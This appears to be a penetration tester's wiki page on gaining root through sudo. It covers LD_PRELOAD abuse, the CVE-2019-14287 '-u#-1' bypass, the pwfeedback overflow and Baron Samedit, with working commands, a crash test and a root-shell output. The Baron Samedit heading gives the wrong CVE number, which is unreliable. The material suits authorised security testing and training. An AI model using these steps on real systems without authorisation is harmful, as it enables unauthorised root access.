# Privilege Escalation via `sudo`

> "Super User Do." Allows a user to execute a particular command(s) with elevated permission.

---

## `sudo` Privilege Escalation Process

1. Attempt [[sudo-for-privesc#LD_PRELOAD Exploitation|LD_PRELOAD exploitation]]
2. See if you can exploit [[sudo-for-privesc#sudo Heap-Based Buffer Overflow CVE-2021-18634 AKA Baron Samedit|Baron Samedit]]
3. See if you can exploit [[sudo-for-privesc#sudo 1 8 28 Security Bypass CVE-2019-14287|CVE-2019-14287]]
4. See if you can exploit [[sudo-for-privesc#sudo 1 8 26 Stack-Based Buffer Overflow CVE-2019-18634|CVE-2019-18634]]
5. Attempt [[sudo-for-privesc#sudo Shell Escaping|sudo Shell Escaping]]

---

## Current User's Allowed and Disallowed `sudo` Commands

This is a part of [[situational-awareness#Current User's Allowed and Disallowed sudo Commands|situational awareness]].

---

## `sudo` Shell Escaping

Abuse the [[situational-awareness#Current User's Allowed and Disallowed sudo Commands|current user's allowed sudo commands]] to perform actions in order to elevate privileges.

### Process

1. Determine the [[situational-awareness#Current User's Allowed and Disallowed sudo Commands|current user's allowed sudo commands]]
2. For each command, determine if it can be abused to elevate privileges:
	- If the command is standard to the Linux distribution:
		- Look them up in [GTFOBins](https://gtfobins.github.io/) to determine how to exploit it in order to elevate privileges
		- If you can't find it in [GTFOBins](https://gtfobins.github.io/), Google `$COMMAND sudo privilege escalation` and see if someone else has already disclosed how to abuse its intended functionality to elevate privileges
	- If the command **is not** standard to a Linux distribution, understand exactly what the command is doing and try to determine how you can exploit it to elevate privileges
		- **Is a command in the `sudo` executable configured without an absolute path?**
			- Can you get your own executable ahead of that command in the `$PATH` search order?
				- Keep [[environment-variables#Inheritance|environment variable inheritance]] in mind
		- **Is a command in the `sudo` executable configured with an absolute path?**
			- Do you have write access to the absolute path? Can you just replace it?
		- **Does a command in the `sudo` executable contain a wildcard (`*`)?**
			- Attempt to abuse [[bash#Wildcard Behavior|bash's wildcard behavior]] to perform an elevated action

---

## `LD_PRELOAD` Exploitation

If the [[situational-awareness#Current User's Allowed and Disallowed sudo Commands|current user's allowed sudo commands]] indicates that running `sudo` retains the environment variable [[LD_PRELOAD]], then you can use this environment variable to execute an arbitrary shared object file before the execution of one of the `sudo` command. This guarantees code execution as the target user of the `sudo` line.

### Process

1. Determine if running `sudo` retains the environment variable [[LD_PRELOAD]]

Note the following `sudo -l` output:

```bash
$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
```

The `env_keep+=LD_PRELOAD` statement is the indicator that running `sudo` retains the environment variable [[LD_PRELOAD]].

2. Stage a [[so-source|malicious shared object file]].

3. Run one of the current user's allowed `sudo` commands, leveraging [[LD_PRELOAD]] to pre-execute the malcious shared object file.

```bash
sudo LD_PRELOAD=$FULL_PATH_TO_SHARED_LIBRARY $SUDO_COMMAND
```

Using the above `sudo -l` output as an example:

```bash
sudo LD_PRELOAD=/home/user/tgihf.so iftop
```

---

## `sudo` < 1.8.28 Security Bypass (CVE-2019-14287)

In `sudo` versions before 1.8.28, if the user is explicitly allowed to use `sudo` to execute a particular `$COMMAND` as all users except for `root`, their `sudo -l` will look something like this:

```bash
$ sudo -l
User tgihf may run the following commands on target01:
    (ALL, !root) $COMMAND
```

`/etc/sudoers` will look like this (low-privileged users likely can't read this):

```bash
$ cat /etc/sudoers
root    ALL=(ALL:ALL) ALL
tgihf ALL=(ALL,!root) $COMMAND
```

These versions of `sudo` fail to properly parse the user ID specified by the `-u` command. Coupled with the above configuration, a user can execute the target `$COMMAND` as `root` like so:

```bash
sudo -u#-1 $COMMAND
```

This works because `#-1` returns a 0. These versions of `sudo` take the 0 return value and change the current security context to that of `root`.

You can also leverage this vulnerability to execute `$COMMAND` as any user other than `root`, where `$USER_ID` is the ID of the target user (available in [[etc-passwd|/etc/passwd]]), like so:

```bash
sudo -u#$USER_ID $COMMAND
```

### Process

1. Determine if the machine's version of `sudo` is vulnerable (< 1.8.28).

```bash
sudo --version
```

2. Determine if the `sudo` configuration is vulnerable (see above).

3. If both the `sudo` version and configuration are vulnerable, exploit the vulnerability (see above).

References:
- [Exploit DB Description & Proof of Concept](https://www.exploit-db.com/exploits/47502)
- [WhiteSource Software Blog Post](https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/)

---

## `sudo` < 1.8.26 Stack-Based Buffer Overflow (CVE-2019-18634)

Generally when you are prompted to enter a password in a Unix environment, the terminal provides no feedback of the characters you are typing in. `sudo` can be configured to provide character feedback by replacing each character with an asterisk (`*`). This feature is enabled by including the `pwfeedback` setting in `/etc/sudoers`. If this feature is enabled, it will also be visible when the user views their [[situational-awareness#Current User's Allowed and Disallowed sudo Commands|allowed sudo commands]].

In `sudo` versions before 1.8.26 with `pwfeedback` enabled, there exists a stack-based buffer overflow vulnerability when entering your password. This vulnerability can be abused to achieve code execution as `root`.

### Process

1. Determine if the machine's version of `sudo` is vulnerable (< 1.8.26).

```bash
sudo --version
```

2. Determine if the `sudo` configuration is vulnerable. One of the following is an indication of a vulnerable configuration:

- When `sudo` prompts the user for their password, asterisk feedback is provided
- `pwfeedback` will be visibile when the user views their [[situational-awareness#Current User's Allowed and Disallowed sudo Commands|allowed sudo commands]]
- `pwfeedback` is specified in `/etc/sudoers`

3. If both the `sudo` version and configuration are vulnerable, download the exploit from [Saleem Rashid's Github repository](https://github.com/saleemrashid/sudo-cve-2019-18634), and compile it with the repository's `Makefile`. As always, it's best to compile it on the target machine or on a machine with the same operating system version.

	Run the exploit. You'll be prompted for the current user's password, but just wait a bit, and you should receive a `root` shell.

```bash
$ ./exploit
[sudo] password for user:
Sorry, try again.
# id
uid=0(root) gid=0(root) groups=0(root),1000(tryhackme)
```

References:
- [Saleem Rashid's Blog Post](https://www.sudo.ws/security/advisories/pwfeedback/)
- [Saleem Rashid's Exploit Github Repository](https://github.com/saleemrashid/sudo-cve-2019-18634)

---

## `sudo` Heap-Based Buffer Overflow (CVE-2021-18634, AKA Baron Samedit)

In `sudo` versions `1.8.1` - `1.8.31p2` and `1.9.0` - `1.9.5p1`, there exists a heap-based buffer overflow vulnerability that enables a low-privileged user to execute code as `root`. No misconfiguration is required to exploit this vulnerability--the vulnerable `sudo` version is enough.

### Process

1. Determine if the current `sudo` version is vulnerable (see above vulnerable version ranges).

```bash
sudo --version
```

2. If the current version of `sudo` lies within the vulnerable range, you can optionally use this proof of concept to validate the existence of the vulnerability. If it results in a memory error, `sudo` is vulnerable.

```bash
sudoedit -s '\' $(python -c 'print("A"*1000)')
```

3. If the current version of `sudo` is vulnerable, download the exploit source code from [bl4sty's Exploit Github Repository](https://github.com/blasty/CVE-2021-3156), and compile it with the repository's `Makefile`. As always, it's best to compile it on the target machine or on a machine with the same operating system version.

	If you run the exploit with no argments, it will display a list of three potential "targets" depending on `sudo` version and operating system version. Choose the target integer based on your operating system and `sudo` version.

```bash
$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------
  
$ ./sudo-hax-me-a-sandwhich $TARGET
```
